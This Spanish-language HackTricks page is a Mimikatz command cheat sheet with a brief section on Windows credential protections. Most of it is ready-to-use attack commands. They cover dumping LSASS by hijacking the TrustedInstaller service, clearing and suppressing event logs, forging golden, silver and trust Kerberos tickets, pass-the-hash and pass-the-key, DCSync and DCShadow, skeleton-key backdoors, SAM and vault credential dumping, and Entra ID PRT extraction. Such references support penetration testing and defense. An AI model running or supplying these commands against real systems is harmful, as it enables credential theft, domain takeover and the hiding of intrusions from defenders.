# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Esta página se basa en una de [adsecurity.org](https://adsecurity.org/?page_id=1821)**. ¡Consulta el original para obtener más información!<sup>[[3]](#references)</sup>

## LM y texto sin cifrar en memoria

Desde Windows 8.1 y Windows Server 2012 R2 en adelante, se han implementado medidas importantes para protegerse contra el robo de credenciales:

- **Los hashes LM y las contraseñas en texto plano** ya no se almacenan en memoria para mejorar la seguridad. Para deshabilitar la autenticación Digest, se debe configurar un ajuste específico del registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, con un valor DWORD de `0`, lo que garantiza que las contraseñas en "texto sin cifrar" no se almacenen en caché en LSASS.

- **La protección de LSA** se introduce para proteger el proceso Local Security Authority (LSA) contra la lectura no autorizada de memoria y la inyección de código. Esto se logra marcando LSASS como un proceso protegido. La activación de la protección de LSA implica:
  1. Modificar el registro en _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ estableciendo `RunAsPPL` en `dword:00000001`.
  2. Implementar un objeto de directiva de grupo (GPO) que aplique este cambio del registro en los dispositivos administrados.

A pesar de estas protecciones, herramientas como Mimikatz pueden eludir la protección de LSA mediante controladores específicos, aunque es probable que estas acciones queden registradas en los registros de eventos.

Esto es aún más importante en las estaciones de trabajo modernas, ya que **Credential Guard está habilitado de forma predeterminada en muchos sistemas Windows 11 22H2+ y Windows Server 2025 unidos a un dominio que no son DC**, mientras que **LSASS como PPL está habilitado de forma predeterminada en instalaciones nuevas de Windows 11 22H2+**. En la práctica, esto significa que `sekurlsa::logonpasswords` suele obtener menos información de la que se esperaba con las técnicas antiguas, y los operadores recurren cada vez más a **minidumps sin conexión**, **la extracción de claves Kerberos (`sekurlsa::ekeys`)** o **módulos orientados a CloudAP/PRT**. Para conocer las medidas de protección, consulta [Windows credentials protections](credentials-protections.md).

### Contrarrestar la eliminación de SeDebugPrivilege

Los administradores suelen tener SeDebugPrivilege, que les permite depurar programas. Este privilegio puede restringirse para evitar los volcados de memoria no autorizados, una técnica común que usan los atacantes para extraer credenciales de la memoria. Sin embargo, incluso si se elimina este privilegio, la cuenta TrustedInstaller aún puede realizar volcados de memoria mediante una configuración de servicio personalizada:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Esto permite volcar la memoria de `lsass.exe` a un archivo, que luego puede analizarse en otro sistema para extraer credenciales:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Opciones de Mimikatz

La manipulación de registros de eventos en Mimikatz implica dos acciones principales: borrar los registros de eventos y aplicar parches al servicio Event para impedir que se registren nuevos eventos. A continuación se indican los comandos para realizar estas acciones:

#### Borrar registros de eventos

Mimikatz sí incluye `event::clear`. Llama a la API de Windows para borrar el registro de eventos clásico seleccionado. El valor predeterminado es `Security`; `/log:` permite seleccionar otro registro, y quien ejecuta el comando necesita permisos para borrarlo. Esto no es lo mismo que `event::drop`, que intenta impedir que se escriban nuevos registros.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Característica experimental: parchear el servicio de eventos

- **Comando**: `event::drop`
- Este comando experimental está diseñado para modificar el comportamiento del Servicio de registro de eventos e impedir que registre nuevos eventos.
- Ejemplo: `mimikatz "privilege::debug" "event::drop" exit`

- El comando `privilege::debug` garantiza que Mimikatz opere con los privilegios necesarios para modificar los servicios del sistema.
- A continuación, el comando `event::drop` parchea el servicio de registro de eventos.

### Ataques con tickets Kerberos

Usa los comandos que aparecen a continuación como recordatorio rápido de la sintaxis. Las páginas específicas sobre [Golden Tickets](../active-directory-methodology/golden-ticket.md), [Silver Tickets](../active-directory-methodology/silver-ticket.md), [Diamond Tickets](../active-directory-methodology/diamond-ticket.md) y [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) incluyen los matices actualizados de AES/PAC/opsec.

### Creación de Golden Ticket

Un Golden Ticket permite suplantar identidades para obtener acceso en todo el dominio. Comando y parámetros principales:

- Comando: `kerberos::golden`
- Parámetros:
  - `/domain`: El nombre del dominio.
  - `/sid`: El identificador de seguridad (SID) del dominio.
  - `/user`: El nombre de usuario que se va a suplantar.
  - `/krbtgt`: El hash NTLM de la cuenta de servicio KDC del dominio.
  - `/ptt`: Inyecta directamente el ticket en la memoria.
  - `/ticket`: Guarda el ticket para usarlo más adelante.

Ejemplo:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Creación de Silver Ticket

Los Silver Tickets otorgan acceso a servicios específicos. Comando y parámetros clave:

- Comando: Similar a Golden Ticket, pero dirigido a servicios específicos.
- Parámetros:
  - `/service`: El servicio al que se dirige (p. ej., cifs, http).
  - Otros parámetros similares a los de Golden Ticket.

Ejemplo:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Creación de Trust Ticket

Los Trust Tickets se utilizan para acceder a recursos entre dominios aprovechando las relaciones de confianza. Comando y parámetros clave:

- Comando: Similar a Golden Ticket, pero para relaciones de confianza.
- Parámetros:
  - `/target`: El FQDN del dominio de destino.
  - `/rc4`: El hash NTLM de la cuenta de confianza.

Ejemplo:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Comandos adicionales de Kerberos

- **Listado de tickets**:

  - Comando: `kerberos::list`
  - Muestra todos los tickets de Kerberos de la sesión del usuario actual.

- **Pass the Cache**: `kerberos::ptc` lee un archivo MIT/Heimdal `.ccache`, **no** un archivo `.kirbi`. Proporciona la ruta del archivo como argumento posicional: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` lee un archivo `.kirbi` o un directorio que contenga este tipo de archivos. También acepta una ruta posicional, no `/ticket:`: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Consulta [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) para ver el flujo de trabajo completo.<sup>[[6]](#references)</sup>

- **Purgar tickets**:
  - Comando: `kerberos::purge`
  - Elimina todos los tickets de Kerberos de la sesión.
  - Es útil antes de usar comandos de manipulación de tickets para evitar conflictos.

### Over-Pass-the-Hash / Pass-the-Key

Si `RC4` está deshabilitado o no es fiable, Mimikatz puede inyectar **claves AES128/AES256 de Kerberos** en la sesión de inicio de sesión actual, en lugar de usar únicamente un hash NT. Esto suele ser más adecuado para dominios modernos que tratar `sekurlsa::pth` como si solo admitiera NTLM.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` reutiliza el proceso actual en lugar de iniciar una nueva consola, lo que resulta práctico cuando quieres ejecutar inmediatamente comandos como `lsadump::dcsync` en el mismo contexto.

### Manipulación de Active Directory

- **DCShadow**: Hace que temporalmente una máquina actúe como un DC para manipular objetos de AD. Consulta [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imita a un DC para solicitar datos de contraseñas. Consulta [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Acceso a credenciales

- **LSADUMP::LSA**: Extrae credenciales de LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Suplanta a un DC usando los datos de contraseña de una cuenta de equipo.

  - _No se proporciona ningún comando específico para NetSync en el contexto original._

- **LSADUMP::SAM**: Accede a la base de datos SAM local.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Descifra los secretos almacenados en el registro.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Establece un nuevo hash NTLM para un usuario.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recupera información de autenticación de confianza.
  - `mimikatz "lsadump::trust" exit`

### Credenciales en la nube / Entra ID

En equipos **Entra ID** o **unidos a un dominio híbrido**, `sekurlsa::cloudap` puede exponer material de **Primary Refresh Token (PRT)** almacenado en caché desde LSASS. Su `ProofOfPossesionKey.KeyValue` es el blob de la clave de sesión protegida por DPAPI, no la clave ya descifrada.<sup>[[7]](#references)[[8]](#references)</sup> Para usar `/unprotect`, ejecuta `dpapi::cloudapkd` como `SYSTEM` (por ejemplo, `token::elevate` desde una sesión de Mimikatz elevada), o primero carga la caché de claves de Mimikatz con `sekurlsa::dpapi`. `privilege::debug` por sí solo no cambia el contexto del llamador de DPAPI.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Copia el `Context` y `Derived Key` **coincidentes** del primer comando al segundo; Mimikatz genera un contexto nuevo cuando no se proporciona ninguno. Incluso para una clave protegida por TPM, Mimikatz puede derivar una clave de firma usando el TPM en el dispositivo original. No es necesario exportar la clave en claro, pero un resultado de clave derivada correcto puede firmar una cookie del navegador.<sup>[[7]](#references)</sup>

Una cadena PRT por sí sola no es suficiente porque Microsoft Entra requiere una prueba de posesión de la clave de sesión asociada.<sup>[[9]](#references)</sup> Consulta [DPAPI key recovery](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) para conocer otras opciones de claves maestras y [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) para la cadena del lado de la nube.

### Varios

- **MISC::Skeleton**: Inyectar una puerta trasera en LSASS en un DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalada de privilegios

- **PRIVILEGE::Backup**: Obtener derechos de copia de seguridad.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtener privilegios de depuración.
  - `mimikatz "privilege::debug" exit`

### Volcado de credenciales

- **SEKURLSA::LogonPasswords**: Mostrar las credenciales de los usuarios que han iniciado sesión.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extraer tickets Kerberos de la memoria.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Manipulación de SID y tokens

- **SID::add/modify**: Cambiar SID y SIDHistory.

  - Añadir: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Modificar: _No hay un comando específico para modificar en el contexto original._

- **TOKEN::Elevate**: Suplantar tokens.
  - `mimikatz "token::elevate /domainadmin" exit`

### Servicios de Terminal

- **TS::MultiRDP**: Permitir varias sesiones RDP.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Listar sesiones TS/RDP.
  - _No se proporcionó un comando específico para TS::Sessions en el contexto original._

### Bóveda

- Extraer contraseñas de Windows Vault.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [Las herramientas de The Hacker – módulos de Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB y Entra ID: descubre tu nuevo flujo de caché](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Referencia de comandos de Mimikatz](https://adsecurity.org/?page_id=1821)
- [4] [Código fuente del módulo de eventos de Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Código fuente del módulo ccache de Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Código fuente del módulo Kerberos de Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Implementación de CloudAP DPAPI de Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Profundizando en el Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Protección del Primary Refresh Token de Microsoft Entra](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
